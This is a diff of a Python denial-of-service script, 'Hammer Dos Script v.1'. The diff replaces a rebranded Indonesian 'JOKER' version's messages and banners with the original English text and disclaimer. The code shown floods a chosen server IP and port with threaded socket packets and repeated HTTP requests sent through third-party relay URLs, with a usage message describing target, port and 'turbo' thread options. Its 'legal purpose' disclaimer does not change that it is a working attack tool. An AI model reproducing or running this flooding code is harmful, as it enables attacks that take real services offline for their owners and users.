@@ -1,28 +1,15 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
-#///////////////////////////////////////////////////////////////////////////////
-#///////////////////////////////////////////////////////////////////////////////
-#////                       _            _  __                              ////
-#////                      | |          (_)/ _|                             ////
-#////                   ___| |_   _  ___ _| |_ ___ _ __                     ////
-#////                  |_  / | | | |/ __| |  _/ _ \ '__|                    ////
-#////                   / /| | |_| | (__| | ||  __/ |                       ////
-#////                  /___|_|\__,_|\___|_|_| \___|_|                       ////
-#////                                                                       ////
-#///////////////////////////////////////////////////////////////////////////////
-#///////////////////////////////////////////////////////////////////////////////
-# Script ini recode dari 
+
 # python 3.3.2+ Hammer Dos Script v.1
+# by Can Yalçın
+# only for legal purpose
 
 
 from queue import Queue
 from optparse import OptionParser
 import time,sys,socket,threading,logging,urllib.request,random
-import sys
-import os
-import time
-import socket
-import random
+
 def user_agent():
 	global uagent
 	uagent=[]
@@ -48,7 +35,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mJOKER menghantam lawan...\033[0m")
+			print("\033[94mbot is hammering...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -62,13 +49,13 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[96m",time.ctime(time.time()),"\033[0m \033[92m <---< JOKER menyerang \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
 			else:
 				s.shutdown(1)
-				print("\033[91mBerhenti<->ah\033[0m")
+				print("\033[91mshut<->down\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91mServer tumbang! JOKER merdeka\033[0m")
+		print("\033[91mno connection! server maybe down\033[0m")
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
 
@@ -86,22 +73,16 @@ def dos2():
 		bot_hammering(random.choice(bots)+"http://"+host)
 		w.task_done()
 
-os.system("clear")
-os.system("figlet serangan")
-os.system("figlet JOKER")
+
 def usage():
-	print (''' \033[97m	
+	print (''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/
+	It is the end user's responsibility to obey all applicable laws.
+	It is just for server testing script. Your ip is visible. \n
+	usage : python3 hammer.py [-s] [-p] [-t]
 	-h : help
-	-s : alamat ip target
-	-p : port target, contoh 80
-	-t : turbo default nya 135
-	
-mulai serang dengan ketik :
-python3 war.py [-s] [-p] [-t]
-contoh : python3 war.py -s 192.168.0.1 -p 80 -t 135\033[0m''')
-
-
-
+	-s : server ip
+	-p : port default 80
+	-t : turbo default 135 \033[0m''')
 	sys.exit()
 
 
@@ -136,6 +117,7 @@ def get_parameters():
 
 # reading headers
 global data
+headers = open("headers.txt", "r")
 data = headers.read()
 headers.close()
 #task queue are q,w
@@ -148,7 +130,7 @@ if __name__ == '__main__':
 		usage()
 	get_parameters()
 	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
-	print("\033[94m JOKER sedang mengintai musuh....\033[0m")
+	print("\033[94mPlease wait...\033[0m")
 	user_agent()
 	my_bots()
 	time.sleep(5)
@@ -157,7 +139,7 @@ if __name__ == '__main__':
 		s.connect((host,int(port)))
 		s.settimeout(1)
 	except socket.error as e:
-		print("\033[91mJOKER Salah sasaran: Cek lagi ip and port target\033[0m")
+		print("\033[91mcheck server ip and port\033[0m")
 		usage()
 	while True:
 		for i in range(int(thr)):
